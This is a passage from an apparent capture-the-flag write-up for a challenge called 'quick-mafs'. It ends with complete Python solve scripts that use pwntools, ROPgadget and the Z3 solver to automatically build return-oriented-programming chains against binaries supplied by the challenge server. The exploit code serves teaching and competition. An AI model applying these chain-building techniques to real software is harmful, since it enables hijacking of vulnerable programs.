s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span><span class="token punctuation">[</span>ULT<span class="token punctuation">(</span>bv<span class="token punctuation">,</span> addsub_limit<span class="token punctuation">)</span> <span class="token keyword">for</span> bv <span class="token keyword">in</span> add_vars<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span><span class="token punctuation">[</span>ULT<span class="token punctuation">(</span>bv<span class="token punctuation">,</span> addsub_limit<span class="token punctuation">)</span> <span class="token keyword">for</span> bv <span class="token keyword">in</span> sub_vars<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span><span class="token punctuation">[</span>ULE<span class="token punctuation">(</span>bv<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> bv <span class="token keyword">in</span> xor_vars<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># Boolean property.</span>

<span class="token comment"># Limitting constraint. Total number of gadgets shouldn't exceed a limit.</span>
gadget_limit <span class="token operator">=</span> <span class="token number">400</span> <span class="token comment"># 4000 bytes limit divide by 8 bytes per gadget.</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>add_vars<span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>sub_vars<span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>xor_vars<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> gadget_limit<span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Now that we limit our gadgets properly, we can move on to our final step: evaluation. We'll kindly ask Z3 to spit out a solution, and construct our payload.</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># Check satisfiability (and also compute a solution).</span>
<span class="token keyword">if</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> sat<span class="token punctuation">:</span>
    <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'unable to satisfy constraints'</span><span class="token punctuation">)</span>
m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Initialise rax first. (8 byte padding for rbp.)</span>
chain <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>init_rax_addr<span class="token punctuation">)</span>

<span class="token comment"># Chain add gadgets.</span>
<span class="token keyword">for</span> bv<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>add_vars<span class="token punctuation">,</span> add_gadgets<span class="token punctuation">)</span><span class="token punctuation">:</span>
    chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>bv<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># m.evaluate(bv).as_long()...</span>
    <span class="token comment">#   == 0 =&gt; nothing is added to the chain.</span>
    <span class="token comment">#   == 1 =&gt; call (chain) gadget once.</span>
    <span class="token comment">#   == 2 =&gt; call (chain) gadget twice.</span>
    <span class="token comment">#   etc...</span>

<span class="token comment"># Chain subtract gadgets.</span>
<span class="token keyword">for</span> bv<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>sub_vars<span class="token punctuation">,</span> sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">:</span>
    chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>bv<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Chain xor gadgets.</span>
<span class="token keyword">for</span> bv<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>xor_vars<span class="token punctuation">,</span> xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">:</span>
    chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>bv<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Finally call print.</span>
chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'print'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># And we're done!</span>
<span class="token keyword">return</span> chain</code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>After modifying the template code to use this procedure, running the code and waiting for a bit, we soon end up with the flag!</p><h3 id="solve-scripts" tabindex="-1"><a class="md-anchor" href="#solve-scripts" aria-hidden="true"></a> Solve Scripts</h3><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># script.py</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">from</span> solve <span class="token keyword">import</span> solve

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"tamuctf.com"</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span><span class="token string">"quick-mafs"</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        instructions <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># the server will give you instructions as to what your exploit should do</span>
        bites <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token comment"># Error (wrong answer, or connection was closed).</span>
        <span class="token keyword">if</span> bites<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'sorry'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> bites<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'Traceback'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>

        <span class="token comment"># Save bytes to a file.</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"elf"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>bites<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>instructions<span class="token operator">=</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

        <span class="token comment"># Parse input and get target value.</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'call print\(\) with rax = 0x([0-9a-f]+)'</span><span class="token punctuation">,</span> instructions<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        target <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

        payload <span class="token operator">=</span> solve<span class="token punctuation">(</span>target<span class="token punctuation">,</span> gadget_limit<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
    <span class="token keyword">pass</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># solve.py</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span>

<span class="token keyword">from</span> ropgadget<span class="token punctuation">.</span>args <span class="token keyword">import</span> Args <span class="token keyword">as</span> ropargs
<span class="token keyword">from</span> ropgadget<span class="token punctuation">.</span>core <span class="token keyword">import</span> Core <span class="token keyword">as</span> ropcore


<span class="token keyword">def</span> <span class="token function">is_good_gadget</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> g<span class="token punctuation">[</span><span class="token string">'gadget'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'lea rbx'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> g<span class="token punctuation">[</span><span class="token string">'gadget'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'ret'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'elf'</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> addsub_limit<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> gadget_limit<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'solving for rax = </span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">resolve_gadget</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>
            <span class="token string">r'lea rbx, \[0x([0-9a-f]+)\] ; (\w+) ax, word ptr \[rbx\] ; ret'</span><span class="token punctuation">,</span> gadget<span class="token punctuation">[</span><span class="token string">'gadget'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'sub'</span><span class="token punctuation">,</span> <span class="token string">'xor'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'operation unknown'</span><span class="token punctuation">)</span>
        const_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'vaddr'</span><span class="token punctuation">:</span> gadget<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'op'</span><span class="token punctuation">:</span> m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'const'</span><span class="token punctuation">:</span> elf<span class="token punctuation">.</span>u16<span class="token punctuation">(</span>const_addr<span class="token punctuation">)</span><span class="token punctuation">}</span>


    <span class="token comment"># `--depth 15` is important, as it tells ROPgadget to search for longer chains.</span>
    core <span class="token operator">=</span> ropcore<span class="token punctuation">(</span>ropargs<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'--binary </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string"> --depth 15 --silent'</span></span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getArgs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> core<span class="token punctuation">.</span>analyze<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"ROPgadget: error analyzing elf"</span><span class="token punctuation">)</span>

    <span class="token comment"># Address containing the `mov rax, XXX; ret` gadget.</span>
    init_rax_addr <span class="token operator">=</span> <span class="token number">0x401004</span>
    rax_init_value <span class="token operator">=</span> elf<span class="token punctuation">.</span>u16<span class="token punctuation">(</span>init_rax_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span>

    good_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span>resolve_gadget<span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>is_good_gadget<span class="token punctuation">,</span> core<span class="token punctuation">.</span>gadgets<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>good_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Find and categorise gadgets.</span>
    xor_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> g<span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'xor'</span><span class="token punctuation">,</span> good_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
    add_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> g<span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'add'</span><span class="token punctuation">,</span> good_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
    sub_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> g<span class="token punctuation">:</span> g<span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'sub'</span><span class="token punctuation">,</span> good_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>add_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span>

    add_vars <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'na_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>add_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    sub_vars <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'ns_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    xor_vars <span class="token operator">=</span> <span class="token punctuation">[</span>BitVec<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'nx_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    add_terms <span class="token operator">=</span> <span class="token punctuation">[</span>v <span class="token operator">*</span> BitVecVal<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'const'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>add_vars<span class="token punctuation">,</span> add_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
    sub_terms <span class="token operator">=</span> <span class="token punctuation">[</span>v <span class="token operator">*</span> BitVecVal<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'const'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>sub_vars<span class="token punctuation">,</span> sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>
    xor_terms <span class="token operator">=</span> <span class="token punctuation">[</span>v <span class="token operator">*</span> BitVecVal<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'const'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> v<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>xor_vars<span class="token punctuation">,</span> xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">]</span>

    <span class="token comment"># XOR everything in xor_terms.</span>
    xor_all <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">^</span> y<span class="token punctuation">,</span> xor_terms<span class="token punctuation">)</span>

    s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Add base constraint which ties everything together.</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>BitVecVal<span class="token punctuation">(</span>rax_init_value<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>add_terms<span class="token punctuation">)</span> <span class="token operator">-</span> Sum<span class="token punctuation">(</span>sub_terms<span class="token punctuation">)</span> <span class="token operator">==</span> BitVecVal<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> xor_all<span class="token punctuation">)</span>

    <span class="token comment"># Bounds constraints.</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span><span class="token punctuation">[</span>ULT<span class="token punctuation">(</span>bv<span class="token punctuation">,</span> addsub_limit<span class="token punctuation">)</span> <span class="token keyword">for</span> bv <span class="token keyword">in</span> add_vars<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span><span class="token punctuation">[</span>ULT<span class="token punctuation">(</span>bv<span class="token punctuation">,</span> addsub_limit<span class="token punctuation">)</span> <span class="token keyword">for</span> bv <span class="token keyword">in</span> sub_vars<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>And<span class="token punctuation">(</span><span class="token punctuation">[</span>ULE<span class="token punctuation">(</span>bv<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> bv <span class="token keyword">in</span> xor_vars<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># Boolean property.</span>

    <span class="token comment"># Limitting constraint. Total number of gadgets shouldn't exceed a limit.</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>add_vars<span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>sub_vars<span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>xor_vars<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> gadget_limit<span class="token punctuation">)</span>

    <span class="token comment"># Check satisfiability (and also compute a solution).</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sat? '</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> sat<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'unable to satisfy constraints'</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Sanity checking.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'add vars:'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>evaluate<span class="token punctuation">,</span> add_vars<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sub vars:'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>evaluate<span class="token punctuation">,</span> sub_vars<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'xor vars:'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>evaluate<span class="token punctuation">,</span> xor_vars<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'total ops:'</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>Sum<span class="token punctuation">(</span>add_vars<span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>sub_vars<span class="token punctuation">)</span> <span class="token operator">+</span> Sum<span class="token punctuation">(</span>xor_vars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Prepend 8 bytes of padding for rbp.</span>
    chain <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">8</span>

    <span class="token comment"># Initialise rax.</span>
    chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>init_rax_addr<span class="token punctuation">)</span>

    <span class="token comment"># Chain add gadgets.</span>
    <span class="token keyword">for</span> bv<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>add_vars<span class="token punctuation">,</span> add_gadgets<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>bv<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Chain subtract gadgets.</span>
    <span class="token keyword">for</span> bv<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>sub_vars<span class="token punctuation">,</span> sub_gadgets<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>bv<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Chain xor gadgets.</span>
    <span class="token keyword">for</span> bv<span class="token punctuation">,</span> g <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>xor_vars<span class="token punctuation">,</span> xor_gadgets<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>g<span class="token punctuation">[</span><span class="token string">'vaddr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>bv<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Finally call print.</span>
    chain <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'print'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'payload length:'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span><span class="token punctuation">)</span>
